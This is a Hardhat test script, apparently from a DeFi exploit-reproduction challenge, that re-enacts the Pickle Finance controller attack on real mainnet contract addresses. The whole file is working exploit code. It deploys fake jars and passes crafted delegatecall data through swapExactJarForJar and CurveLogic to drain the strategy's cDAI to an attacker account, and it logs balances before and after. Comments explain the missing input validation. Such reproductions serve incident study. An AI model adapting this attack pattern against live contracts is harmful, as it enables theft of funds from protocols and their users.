const { ethers } = require('hardhat');
const { expect } = require('chai');

const CONTROLLER = '0x6847259b2B3A4c17e7c43C54409810aF48bA5210';
const CURVE_LOGIC = '0x6186E99D9CFb05E1Fdf1b442178806E81da21dD8';
const STRATEGY_CMPD_DAI_V2 = '0xCd892a97951d46615484359355e3Ed88131f829D';

const DAI_ = '0x6B175474E89094C44Da98b954EedeAC495271d0F';
const CDAI = '0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643';
const PICKLE_JAR = '0x6949Bb624E8e8A90F87cD2058139fcd77D2F3F87';

describe('[Challenge] Pickle', function () {
  let DAI;
  let cDAI;
  let pickleJar;
  let strategyCmpdDai;
  let curve;
  let fakeUnderlying;
  let fakeJarA;
  let fakeJarB;
  let fakeJarC;
  let fakeJarD;
  let controller;

  before(async function () {
    DAI = await ethers.getContractAt('ERC20', DAI_);
    cDAI = await ethers.getContractAt('CErc20Delegator', CDAI);
    pickleJar = await ethers.getContractAt('IJar', PICKLE_JAR);

    strategyCmpdDai = await ethers.getContractAt('IStrategyCmpdDaiV2', STRATEGY_CMPD_DAI_V2);

    curve = await ethers.getContractAt('CurveLogic', CURVE_LOGIC);

    const fakeUnderlyingFactory = await ethers.getContractFactory('FakeUnderlying');
    fakeUnderlying = await fakeUnderlyingFactory.deploy(cDAI.address);

    const fakeJarFactory = await ethers.getContractFactory('FakeJar');
    fakeJarA = await fakeJarFactory.deploy(DAI.address); // FakeJar 的 Underlying 是 DAI
    fakeJarB = await fakeJarFactory.deploy(cDAI.address); // FakeJar 的 Underlying 是 cDAI
    fakeJarC = await fakeJarFactory.deploy(DAI.address); // FakeJar 的 Underlying 是 DAI
    fakeJarD = await fakeJarFactory.deploy(cDAI.address); // FakeJar 的 Underlying 是 cDAI

    controller = await ethers.getContractAt('Controller', CONTROLLER);
  });

  it('Exploit', async function () {
    [attacker] = await ethers.getSigners();

    // const balance = await strategyCmpdDai.getSuppliedUnleveraged();
    // console.log(`getSuppliedUnleveraged(): ${balance}`, balance);

    console.log('Before, Attacker cDAI Balance', await formatToken(await cDAI.balanceOf(attacker.address), cDAI));
    console.log(
      'Before, Strategy cDAI Balance',
      await formatToken(await cDAI.balanceOf(strategyCmpdDai.address), cDAI)
    );
    console.log('Before, Strategy DAI Balance', await formatToken(await DAI.balanceOf(strategyCmpdDai.address), DAI));
    console.log('Before, DAI balance on pDAI', await formatToken(await DAI.balanceOf(pickleJar.address), DAI));

    // 從 Pickle Controller.swapExactJarForJar() 發動攻擊
    // swapExactJarForJar() 未驗證參數 _fromJar, _toJar 是否為官方的 Jar 合約地址，也未過濾參數 _targets, _data 的內容
    // 加上 swapExactJarForJar() 中的 _execute() 有呼叫 delegatecall()，導致攻擊者可以劫持 Controller 身份進行任意 Delegatecall 調用
    // swapExactJarForJar() ref: https://etherscan.io/address/0x6847259b2B3A4c17e7c43C54409810aF48bA5210#code#F26#L249
    // _execute() ref: https://etherscan.io/address/0x6847259b2B3A4c17e7c43C54409810aF48bA5210#code#F26#L336
    await controller.swapExactJarForJar(fakeJarA.address, fakeJarB.address, 19728769153362174946836922n, 0, [], []);

    await pickleJar.earn();
    await pickleJar.earn();
    await pickleJar.earn();

    const borrowedView = await strategyCmpdDai.getBorrowedView();
    console.log(`borrowedView: ${borrowedView}`);

    const withdrawIntf = new ethers.utils.Interface(['function withdraw(address)']);
    const withdrawFunctionSelector = withdrawIntf.getSighash('withdraw(address)');
    const targets = [curve.address];
    const datas = [getFunctionSignature(STRATEGY_CMPD_DAI_V2, withdrawFunctionSelector, fakeUnderlying.address)];
    console.log(`datas: ${datas[0]}`);
    await controller.swapExactJarForJar(fakeJarC.address, fakeJarD.address, 0, 0, targets, datas);

    const balanceOfUnderlying = await cDAI.balanceOfUnderlying(attacker.address);
    console.log(`balanceOfUnderlying: ${balanceOfUnderlying}`, balanceOfUnderlying);

    // const u = await cDAI.redeemUnderlying();
    // console.log(`u: ${u}`);

    // Attacker has taken all tokens from the pool
    console.log('After, Attacker cDAI Balance', await formatToken(await cDAI.balanceOf(attacker.address), cDAI));
    console.log('After, Strategy cDAI Balance', await formatToken(await cDAI.balanceOf(strategyCmpdDai.address), cDAI));
    console.log('After, Strategy DAI Balance', await formatToken(await DAI.balanceOf(strategyCmpdDai.address), DAI));
    console.log('After, DAI balance on pDAI', await formatToken(await DAI.balanceOf(pickleJar.address), DAI));
    expect(await cDAI.balanceOf(attacker.address)).to.greaterThan(ethers.utils.parseUnits('0'));
  });
});

function getFunctionSignature(calleeAddress, functionSelector, underlyingAddress) {
  // Curve.add_liquidity ref: https://etherscan.io/address/0x6186E99D9CFb05E1Fdf1b442178806E81da21dD8#code#F28#L27
  const ABI = [
    'function add_liquidity(address curve, bytes4 curveFunctionSig, uint256 curvePoolSize, uint256 curveUnderlyingIndex, address underlying)',
  ];
  const iAbi = new ethers.utils.Interface(ABI);
  const data = iAbi.encodeFunctionData('add_liquidity', [calleeAddress, functionSelector, 1, 0, underlyingAddress]);
  return data;
}

async function formatToken(amount, token) {
  const tokenSymbol = await token.symbol();
  const decimals = await token.decimals();
  return `${ethers.utils.formatUnits(amount, decimals)} ${tokenSymbol}`;
}
